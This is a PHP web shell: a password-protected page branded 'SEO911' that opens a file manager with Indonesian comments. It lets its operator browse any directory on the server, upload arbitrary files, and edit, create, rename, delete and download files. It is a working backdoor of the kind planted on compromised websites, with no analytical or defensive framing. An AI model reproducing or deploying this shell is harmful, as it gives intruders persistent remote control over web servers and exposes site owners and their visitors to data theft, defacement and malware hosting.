<?php
session_start();
$password = "27dc4d96874bb6df9fde4ef5a097eb7e";

function login_shell()
{
?>
    <html>
<head>
	<title>SEO911</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlhWF814vNEkEgBk1g8F_bWOEGaGJwDNgwPlZjNxkCpgIBJL4GFhKPnQptuYtQ3ooTdOWVOvFgmja4b19N0QwfOYN9PcDf3klVXNJFTM1HwptCYQ6nAao_hoI15xfnjmi4P1r07w5ScKbeFvow65o2vpSGYBUBf-8ZyLgeK4LXT_ICKb_kkRCJ58Ih-cR7/s512/dg.png" />
</head><l
<body>
<div class="login">
    <h2 class="login-header">
        SEO911
    </h2>
    <form class="login-container" action="" method="post">
        <div align="center">
            <input type="Password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value="LOGIN">
          </div>
    </form>
</div>
</body>
</html>
<style>
body {
    background: rgb(87, 87, 87);
    font-family: 'Beautiful Vampires', sans-serif;
    background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFL6h6cTUiKmn-5H62NvzxZAFM3nAHMZQ_g90J5UovoYjnouxwXYfk6vxThzJiM1rT6Qaaak2jl_wWMl9q0WeNr_Li3lh5ZZzIib34KUEOlumXvj72zEhpQQOXtMXKCsDP-7n0JOqm7BCBh5WqwmGXP7ZDkrLYXVFwpbgkcMA55fkDbyDWHIdPll4jtpK8/s1919/seo911lagi.png);
  }
  .login {
    width: 400px;
    margin: 16px auto;
    font-size: 16px;
  }
  /* Reset top and bottom margins from certain elements */
  .login-header,
  .login p {
    margin-top: 0;
    margin-bottom: 0;
  }
  .login-header {
    background: #790000;
    padding: 20px;
    font-size: 1.4em;
    font-weight: normal;
    text-align: center;
    text-transform: uppercase;
    color: #fff;
    border: 2px solid #ffca2d;
  }
  .login-container {
    background: #2d2d2d;
    padding: 12px;
    border-radius: 10px 10px;
  }
  /* Every row inside .login-container is defined with p tags */
  .login p {
    padding: 12px;
  }
  .login input {
    box-sizing: border-box;
    display: block;
    width: 100%;
    border-width: 1px;
    border-style: solid;
    padding: 16px;
    outline: 0;
    font-family: inherit;
    font-size: 0.95em;
  }
  .login input[type="email"],
  .login input[type="password"] {
    background: #e9e9e9;
    border-color: #bbb;
    color: #555;
  }
  /* Text fields' focus effect */
  .login input[type="email"]:focus,
  .login input[type="password"]:focus {
    border-color: #888;
  }
  .login input[type="submit"] {
    background: #790000;
    border-color: transparent;
    color: #fff;
    cursor: pointer;
    border: 2px solid #ffca2d;
    border-radius: 5px 5px;
  }
  .login input[type="submit"]:hover {
    background: #17c;
  }
  /* Buttons' focus effect */
  .login input[type="submit"]:focus {
    border-color: #05a;
  }
</style>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell();
    }
}
?>
<?php
// Set directory root menjadi public_html
$root_dir = realpath(__DIR__);  // Ini mengatur root menjadi folder di mana file PHP ini disimpan
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root_dir;

// Periksa jika direktori yang diminta valid dan dapat diakses
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $root_dir; // Jika direktori tidak valid, kembali ke root_dir
}

// Fungsi untuk menampilkan list file & folder, dengan folder di atas dan file di bawah
function listDirectory($dir)
{
    $files = scandir($dir);

    // Array untuk menyimpan folder dan file terpisah
    $directories = [];
    $regular_files = [];

    // Pisahkan folder dan file ke dalam array yang berbeda
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            if (is_dir($dir . '/' . $file)) {
                $directories[] = $file;  // Masukkan ke array folder
            } else {
                $regular_files[] = $file; // Masukkan ke array file biasa
            }
        }
    }

    // Tampilkan folder di atas
    foreach ($directories as $directory) {
        echo '<tr>';
        echo '<td><a href="?dir=' . urlencode($dir . '/' . $directory) . '">📁 ' . $directory . '</a></td>';
        echo '<td>Folder</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($directory) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($directory) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($directory) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($directory) . '">Download</a>
        </td>';
        echo '</tr>';
    }

    // Tampilkan file di bawah
    foreach ($regular_files as $file) {
        echo '<tr>';
        echo '<td>' . $file . '</td>';
        echo '<td>' . filesize($dir . '/' . $file) . ' bytes</td>';
        echo '<td>
            <a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">Edit</a> |
            <a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '">Delete</a> |
            <a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">Rename</a> |
            <a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">Download</a>
        </td>';
        echo '</tr>';
    }
}

// Fungsi untuk menghapus file
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . $_GET['delete'];
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    }
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk download file
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . $_GET['download'];
    if (is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Fungsi untuk rename file
if (isset($_POST['rename_file'])) {
    $old_name = $current_dir . '/' . $_POST['old_name'];
    $new_name = $current_dir . '/' . $_POST['new_name'];
    rename($old_name, $new_name);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk upload file
if (isset($_POST['upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file"]["name"]);
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_to_edit = $current_dir . '/' . $_POST['file_name'];
    $new_content = $_POST['file_content'];
    file_put_contents($file_to_edit, $new_content);
    header("Location: ?dir=" . urlencode($_GET['dir']));
}

// Fungsi untuk membuat file baru
if (isset($_POST['create_file'])) {
    $new_file_name = $_POST['new_file_name'];
    $new_file_path = $current_dir . '/' . $new_file_name;
    // Buat file baru dengan konten kosong
    file_put_contents($new_file_path, "");
    header("Location: ?dir=" . urlencode($_GET['dir']));
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>TripleDNN</title>
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
            background-color: #121212;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #222;
        }
        tr:nth-child(odd) {
            background-color: #121212;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #121212;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #222;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #222;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <p>Current Directory: <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #03DAC6;"><?php echo $current_dir; ?></a></p>
    
    <div class="form-container">
        <!-- Form untuk upload file -->
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit" name="upload">Upload</button>
        </form>

        <!-- Form untuk membuat file baru -->
        <form method="post">
            <input type="text" name="new_file_name" placeholder="New file name" required>
            <button type="submit" name="create_file">Create File</button>
        </form>
    </div>

    <table border="1">
        <thead>
            <tr>
                <th>File Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir); ?>
        </tbody>
    </table>

    <!-- Form untuk rename file -->
    <?php if (isset($_GET['rename'])): ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">
        <input type="text" name="new_name" placeholder="New name" style="width: 100%; padding: 10px;">
        <button type="submit" name="rename_file">Rename</button>
    </form>
    <?php endif; ?>

    <!-- Form untuk mengedit file -->
    <?php
    if (isset($_GET['edit'])):
        $file_to_edit = $current_dir . '/' . $_GET['edit'];
        if (is_file($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            ?>
            <form method="post">
                <input type="hidden" name="file_name" value="<?php echo $_GET['edit']; ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br>
                <button type="submit" name="save_file">Save Changes</button>
            </form>
        <?php }
    endif; ?>
</body>
</html>
